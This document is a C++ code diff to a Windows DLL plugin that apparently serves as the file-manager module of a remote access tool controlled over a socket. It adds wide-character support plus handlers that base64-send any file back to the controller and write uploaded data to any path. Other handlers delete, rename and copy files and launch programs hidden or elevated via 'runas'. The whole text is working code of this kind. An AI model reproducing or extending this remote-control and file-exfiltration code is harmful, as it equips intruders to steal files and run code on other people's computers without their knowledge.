@@ -7,6 +7,7 @@
 #include <vector>
 #include <cstdint>
 #include <algorithm>
+#include <fstream>
 #include "../../include/json.hpp"
 
 #pragma comment(lib, "ws2_32.lib")
@@ -16,7 +17,94 @@
 using json = nlohmann::json;
 using namespace std;
 
-static string clipboard_path = "";
+static wstring clipboard_path = L"";
+
+// Base64 Alphabet
+static const string base64_chars =
+             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+             "abcdefghijklmnopqrstuvwxyz"
+             "0123456789+/";
+
+static string base64_encode(const vector<uint8_t>& buf) {
+    string ret;
+    int i = 0;
+    int j = 0;
+    uint8_t char_array_3[3];
+    uint8_t char_array_4[4];
+    size_t in_len = buf.size();
+    const uint8_t* bytes_to_encode = buf.data();
+
+    while (in_len--) {
+        char_array_3[i++] = *(bytes_to_encode++);
+        if (i == 3) {
+            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
+            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
+            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
+            char_array_4[3] = char_array_3[2] & 0x3f;
+
+            for(i = 0; (i <4) ; i++) ret += base64_chars[char_array_4[i]];
+            i = 0;
+        }
+    }
+
+    if (i) {
+        for(j = i; j < 3; j++) char_array_3[j] = '\0';
+        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
+        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
+        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
+        char_array_4[3] = char_array_3[2] & 0x3f;
+        for (j = 0; (j < i + 1); j++) ret += base64_chars[char_array_4[j]];
+        while((i++ < 3)) ret += '=';
+    }
+    return ret;
+}
+
+static vector<uint8_t> base64_decode(string const& encoded_string) {
+    int in_len = encoded_string.size();
+    int i = 0;
+    int j = 0;
+    int in_ = 0;
+    uint8_t char_array_4[4], char_array_3[3];
+    vector<uint8_t> ret;
+
+    while (in_len-- && (encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
+        char_array_4[i++] = encoded_string[in_]; in_++;
+        if (i == 4) {
+            for (i = 0; i <4; i++) char_array_4[i] = base64_chars.find(char_array_4[i]);
+            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
+            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
+            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
+            for (i = 0; (i < 3); i++) ret.push_back(char_array_3[i]);
+            i = 0;
+        }
+    }
+
+    if (i) {
+        for (j = i; j <4; j++) char_array_4[j] = 0;
+        for (j = 0; j <4; j++) char_array_4[j] = base64_chars.find(char_array_4[j]);
+        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
+        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
+        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
+        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
+    }
+    return ret;
+}
+
+static string wide_to_utf8(const wstring& wstr) {
+    if (wstr.empty()) return string();
+    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
+    string strTo(size_needed, 0);
+    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
+    return strTo;
+}
+
+static wstring utf8_to_wide(const string& str) {
+    if (str.empty()) return wstring();
+    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
+    wstring wstrTo(size_needed, 0);
+    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
+    return wstrTo;
+}
 
 static void send_json(SOCKET sock, const json& data) {
     string msg = data.dump() + "\r\n";
@@ -25,13 +113,14 @@ static void send_json(SOCKET sock, const json& data) {
 
 static string get_last_error_message(DWORD errorCode) {
     if (errorCode == ERROR_SUCCESS) return "Success";
-    char* buffer = nullptr;
-    DWORD size = FormatMessageA(
+    wchar_t* buffer = nullptr;
+    DWORD size = FormatMessageW(
         FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
-        NULL, errorCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&buffer, 0, NULL
+        NULL, errorCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPWSTR)&buffer, 0, NULL
     );
-    string message = (size && buffer) ? string(buffer, size) : ("Error code: " + to_string(errorCode));
+    wstring wmsg = (size && buffer) ? wstring(buffer, size) : (L"Error code: " + to_wstring(errorCode));
     if (buffer) LocalFree(buffer);
+    string message = wide_to_utf8(wmsg);
     while (!message.empty() && (message.back() == '\r' || message.back() == '\n' || message.back() == ' '))
         message.pop_back();
     return message;
@@ -45,7 +134,7 @@ static string format_size(uint64_t size) {
         dSize /= 1024;
         unit++;
     }
-    char buf[32];
+    char buf[64];
     sprintf(buf, "%.2f %s", dSize, units[unit]);
     return string(buf);
 }
@@ -64,43 +153,43 @@ static void send_drives(SOCKET sock) {
     response["type"] = "drives";
     json drives = json::array();
 
-    char driveStrings[256];
-    DWORD length = GetLogicalDriveStringsA(sizeof(driveStrings), driveStrings);
+    wchar_t driveStrings[512];
+    DWORD length = GetLogicalDriveStringsW(512, driveStrings);
     if (length > 0) {
-        char* drive = driveStrings;
+        wchar_t* drive = driveStrings;
         while (*drive) {
-            drives.push_back(string(drive));
-            drive += strlen(drive) + 1;
+            drives.push_back(wide_to_utf8(drive));
+            drive += wcslen(drive) + 1;
         }
     }
     response["drives"] = drives;
     send_json(sock, response);
 }
 
-static void send_files(SOCKET sock, string path) {
+static void send_files(SOCKET sock, wstring path) {
     if (path.empty()) {
         send_drives(sock);
         return;
     }
 
-    if (path.back() != '\\') path += "\\";
+    if (path.back() != L'\\') path += L"\\";
 
     json response;
     response["action"] = "filemanager_response";
     response["type"] = "files";
-    response["path"] = path;
+    response["path"] = wide_to_utf8(path);
     json files = json::array();
 
-    WIN32_FIND_DATAA findData;
-    HANDLE hFind = FindFirstFileA((path + "*").c_str(), &findData);
+    WIN32_FIND_DATAW findData;
+    HANDLE hFind = FindFirstFileW((path + L"*").c_str(), &findData);
 
     if (hFind != INVALID_HANDLE_VALUE) {
         do {
-            if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)
+            if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0)
                 continue;
 
             json item;
-            item["name"] = string(findData.cFileName);
+            item["name"] = wide_to_utf8(findData.cFileName);
             item["date"] = filetime_to_string(findData.ftLastWriteTime);
 
             if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
@@ -112,7 +201,7 @@ static void send_files(SOCKET sock, string path) {
                 item["size"] = format_size(size);
             }
             files.push_back(item);
-        } while (FindNextFileA(hFind, &findData));
+        } while (FindNextFileW(hFind, &findData));
         FindClose(hFind);
     }
 
@@ -141,84 +230,121 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
             send_drives(sock);
         }
         else if (action == "getfiles") {
-            send_files(sock, command.value("path", ""));
+            send_files(sock, utf8_to_wide(command.value("path", "")));
         }
         else if (action == "deletefile") {
-            string path = command.value("path", "");
-            DWORD attr = GetFileAttributesA(path.c_str());
+            wstring path = utf8_to_wide(command.value("path", ""));
+            DWORD attr = GetFileAttributesW(path.c_str());
             BOOL success = FALSE;
             if (attr != INVALID_FILE_ATTRIBUTES) {
-                if (attr & FILE_ATTRIBUTE_DIRECTORY) success = RemoveDirectoryA(path.c_str());
-                else success = DeleteFileA(path.c_str());
+                if (attr & FILE_ATTRIBUTE_DIRECTORY) success = RemoveDirectoryW(path.c_str());
+                else success = DeleteFileW(path.c_str());
             }
             if (success) {
-                send_log(sock, "Deleted: " + path);
-                string parent = path.substr(0, path.find_last_of("\\"));
+                send_log(sock, "Deleted: " + wide_to_utf8(path));
+                size_t last_slash = path.find_last_of(L"\\");
+                wstring parent = (last_slash != wstring::npos) ? path.substr(0, last_slash) : L"";
                 send_files(sock, parent);
             } else {
                 send_log(sock, "Delete failed: " + get_last_error_message(GetLastError()));
             }
         }
         else if (action == "rename") {
-            string oldpath = command.value("oldpath", "");
-            string newpath = command.value("newpath", "");
-            if (MoveFileA(oldpath.c_str(), newpath.c_str())) {
-                send_log(sock, "Renamed to: " + newpath);
-                string parent = oldpath.substr(0, oldpath.find_last_of("\\"));
+            wstring oldpath = utf8_to_wide(command.value("oldpath", ""));
+            wstring newpath = utf8_to_wide(command.value("newpath", ""));
+            if (MoveFileW(oldpath.c_str(), newpath.c_str())) {
+                send_log(sock, "Renamed to: " + wide_to_utf8(newpath));
+                size_t last_slash = oldpath.find_last_of(L"\\");
+                wstring parent = (last_slash != wstring::npos) ? oldpath.substr(0, last_slash) : L"";
                 send_files(sock, parent);
             } else {
                 send_log(sock, "Rename failed: " + get_last_error_message(GetLastError()));
             }
         }
         else if (action == "execute") {
-            string path = command.value("path", "");
+            wstring path = utf8_to_wide(command.value("path", ""));
             string mode = command.value("mode", "normal");
             INT show = SW_SHOWNORMAL;
             if (mode == "hidden") show = SW_HIDE;
 
             HINSTANCE res;
             if (mode == "runas") {
-                res = ShellExecuteA(NULL, "runas", path.c_str(), NULL, NULL, show);
+                res = ShellExecuteW(NULL, L"runas", path.c_str(), NULL, NULL, show);
             } else {
-                res = ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, show);
+                res = ShellExecuteW(NULL, L"open", path.c_str(), NULL, NULL, show);
             }
 
-            if ((uintptr_t)res > 32) send_log(sock, "Executed (" + mode + "): " + path);
+            if ((uintptr_t)res > 32) send_log(sock, "Executed (" + mode + "): " + wide_to_utf8(path));
             else send_log(sock, "Execute failed: " + get_last_error_message(GetLastError()));
         }
         else if (action == "createfolder") {
-            string path = command.value("path", "");
-            if (CreateDirectoryA(path.c_str(), NULL)) {
-                send_log(sock, "Folder created: " + path);
-                string parent = path.substr(0, path.find_last_of("\\"));
+            wstring path = utf8_to_wide(command.value("path", ""));
+            if (CreateDirectoryW(path.c_str(), NULL)) {
+                send_log(sock, "Folder created: " + wide_to_utf8(path));
+                size_t last_slash = path.find_last_of(L"\\");
+                wstring parent = (last_slash != wstring::npos) ? path.substr(0, last_slash) : L"";
                 send_files(sock, parent);
             } else {
                 send_log(sock, "Create folder failed: " + get_last_error_message(GetLastError()));
             }
         }
         else if (action == "copyfile") {
-            clipboard_path = command.value("path", "");
-            send_log(sock, "Copied to clipboard: " + clipboard_path);
+            clipboard_path = utf8_to_wide(command.value("path", ""));
+            send_log(sock, "Copied to clipboard: " + wide_to_utf8(clipboard_path));
         }
         else if (action == "pastefile") {
             if (clipboard_path.empty()) {
                 send_log(sock, "Clipboard is empty");
                 return;
             }
-            string dest_dir = command.value("path", "");
-            if (dest_dir.back() != '\\') dest_dir += "\\";
-            string filename = clipboard_path.substr(clipboard_path.find_last_of("\\") + 1);
-            string dest_path = dest_dir + filename;
+            wstring dest_dir = utf8_to_wide(command.value("path", ""));
+            if (dest_dir.back() != L'\\') dest_dir += L"\\";
+            size_t last_slash = clipboard_path.find_last_of(L"\\");
+            wstring filename = (last_slash != wstring::npos) ? clipboard_path.substr(last_slash + 1) : clipboard_path;
+            wstring dest_path = dest_dir + filename;
 
-            if (CopyFileA(clipboard_path.c_str(), dest_path.c_str(), FALSE)) {
-                send_log(sock, "Pasted: " + dest_path);
+            if (CopyFileW(clipboard_path.c_str(), dest_path.c_str(), FALSE)) {
+                send_log(sock, "Pasted: " + wide_to_utf8(dest_path));
                 send_files(sock, dest_dir);
             } else {
                 send_log(sock, "Paste failed: " + get_last_error_message(GetLastError()));
             }
         }
         else if (action == "downloadfile") {
-            send_log(sock, "Download initiated (Feature to be implemented in next phase)");
+            wstring path = utf8_to_wide(command.value("path", ""));
+            ifstream file(path, ios::binary);
+            if (!file.is_open()) {
+                send_log(sock, "Download failed: Could not open file");
+                return;
+            }
+            vector<uint8_t> buffer((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
+            file.close();
+
+            json response;
+            response["action"] = "filemanager_response";
+            response["type"] = "download";
+            response["name"] = wide_to_utf8(path.substr(path.find_last_of(L"\\") + 1));
+            response["data"] = base64_encode(buffer);
+            send_json(sock, response);
+            send_log(sock, "File downloaded: " + wide_to_utf8(path));
+        }
+        else if (action == "uploadfile") {
+            wstring path = utf8_to_wide(command.value("path", ""));
+            string base64_data = command.value("data", "");
+            vector<uint8_t> data = base64_decode(base64_data);
+
+            ofstream file(path, ios::binary);
+            if (!file.is_open()) {
+                send_log(sock, "Upload failed: Could not create file");
+                return;
+            }
+            file.write((const char*)data.data(), data.size());
+            file.close();
+
+            send_log(sock, "File uploaded: " + wide_to_utf8(path));
+            size_t last_slash = path.find_last_of(L"\\");
+            wstring parent = (last_slash != wstring::npos) ? path.substr(0, last_slash) : L"";
+            send_files(sock, parent);
         }
     } catch (...) {
         send_log(sock, "Client-side plugin error processing command");
